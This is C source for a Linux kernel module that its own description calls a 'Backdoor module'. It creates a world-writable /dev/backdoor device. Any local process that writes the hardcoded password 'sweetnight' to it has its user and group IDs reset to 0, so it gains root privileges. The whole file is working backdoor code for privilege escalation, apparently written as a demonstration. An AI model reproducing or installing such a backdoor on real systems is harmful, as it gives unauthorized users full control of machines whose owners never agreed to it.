#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Dawid Macek");
MODULE_DESCRIPTION("Backdoor module");

#define MODULE_LOG(fmt, ...) {\
  printk("===== /dev/%s =====", THIS_MODULE->name);  \
  printk(fmt, ##__VA_ARGS__);\
}

#define BD_KBUFF_SZ 1<<8
#define BD_PASS "sweetnight"

static ssize_t backdoor_write(struct file *, const char *, size_t, loff_t *);

static const struct file_operations backdoor_fops = {
 .owner = THIS_MODULE,
 .write = backdoor_write
};

static struct miscdevice backdoor_device = {
 .minor = MISC_DYNAMIC_MINOR,
 .name  = "backdoor",
 .fops  = &backdoor_fops,
 .mode  = 0777
};

static ssize_t backdoor_write(struct file *filep, const char *buff, size_t count, loff_t *offp)
{
  int result;
  size_t to_read;
  char kbuff[BD_KBUFF_SZ];
  struct cred *cred;

  if(*offp != 0)
    return 0;

  to_read = (count > BD_KBUFF_SZ) ? BD_KBUFF_SZ : count;
  result = copy_from_user(kbuff, buff, to_read);
  if(result != 0)
    goto out;

  result = strcmp(kbuff, BD_PASS);
  if(result != 0)
    goto out;

  cred = current->cred;
  MODULE_LOG("prev: uid: %d, gid: %d, euid: %d, egid: %d\n",
             cred->uid.val, cred->gid.val, cred->euid.val, cred->egid.val);

  MODULE_LOG("task pid: %d\n", current->pid);

  // uid and gid are used for privilege inheritance
  // euid and egid are used for checking privileges of current task
  cred->uid.val = cred->gid.val = cred->euid.val = cred->egid.val = 0;
  commit_creds(cred);

  MODULE_LOG("after: uid: %d, gid: %d, euid: %d, egid: %d\n",
             cred->uid.val, cred->gid.val, cred->euid.val, cred->egid.val);

 out:
  *offp += to_read;
  return count;
}

static int __init backdoor_init(void)
{
  int result = 0;

  result = misc_register(&backdoor_device);
  if(result != 0) {
    MODULE_LOG("unable to register device. code: %d\n", result);
    return result;
  }

  MODULE_LOG("load ok\n");
  return result;
}

static void __exit backdoor_exit(void)
{
  misc_deregister(&backdoor_device);
  MODULE_LOG("unload ok\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);
